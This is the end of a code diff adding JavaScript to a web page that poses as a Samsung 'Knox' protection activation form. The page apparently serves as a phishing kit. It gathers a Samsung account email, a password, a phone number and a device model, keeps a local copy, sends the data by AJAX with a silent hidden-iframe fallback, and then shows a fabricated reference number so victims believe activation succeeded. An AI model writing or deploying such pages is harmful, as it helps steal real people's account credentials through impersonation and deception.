+      return r.json().then(function (j) {
+        return r.ok && (j.success === "true" || j.success === true);
+      });
+    });
+  }
+
+  /* ==================== SUBMIT ==================== */
+  form.addEventListener("submit", function (e) {
+    e.preventDefault();
+    if (!validStep1() || !validStep2()) {
+      if (!validStep1()) goTo(1);
+      return;
+    }
+
+    var payload = buildPayload();
+
+    submitBtn.disabled = true;
+    submitLbl.textContent = "Activating…";
+    submitBtn.querySelector("svg").style.display = "none";
+    var sp = document.createElement("span");
+    sp.className = "spinner";
+    submitBtn.appendChild(sp);
+
+    /* local backup so nothing is ever lost */
+    try {
+      var store = JSON.parse(localStorage.getItem("knox_submissions") || "[]");
+      store.push(payload);
+      localStorage.setItem("knox_submissions", JSON.stringify(store));
+    } catch (err) {}
+
+    ajaxPost(payload)
+      .catch(function () { return false; })
+      .then(function (ok) {
+        if (!ok) iframePost(payload); // silent, reliable fallback
+        setTimeout(function () { finish(payload); }, ok ? 250 : 700);
+      });
+  });
+
+  function finish(payload) {
+    intro.style.display = "none";
+    progress.style.display = "none";
+    form.style.display = "none";
+    successEl.classList.add("show");
+
+    document.getElementById("ref").textContent =
+      "SM-" + Math.random().toString(36).slice(2, 7).toUpperCase() + "-" +
+      Date.now().toString(36).slice(-4).toUpperCase();
+    document.getElementById("refEmail").textContent = payload["Samsung account email"];
+    document.getElementById("refDevice").textContent = payload["Device model"];
+
+    document.getElementById("card").scrollIntoView({ behavior: "smooth", block: "start" });
+  }
+
+  document.getElementById("again").addEventListener("click", function () {
+    form.reset();
+    passEl.type = "password";
+    document.getElementById("eye").style.color = "";
+    [emailEl, passEl, phoneEl, deviceEl].forEach(function (el) { showErr(el.id, false); });
+
+    submitBtn.disabled = false;
+    submitLbl.textContent = "Activate protection";
+    var sp = submitBtn.querySelector(".spinner");
+    if (sp) sp.remove();
+    submitBtn.querySelector("svg").style.display = "";
+
+    successEl.classList.remove("show");
+    intro.style.display = "";
+    progress.style.display = "";
+    form.style.display = "";
+    goTo(1);
+  });
+})();
+</script>
+</body>
+                                                              </html>
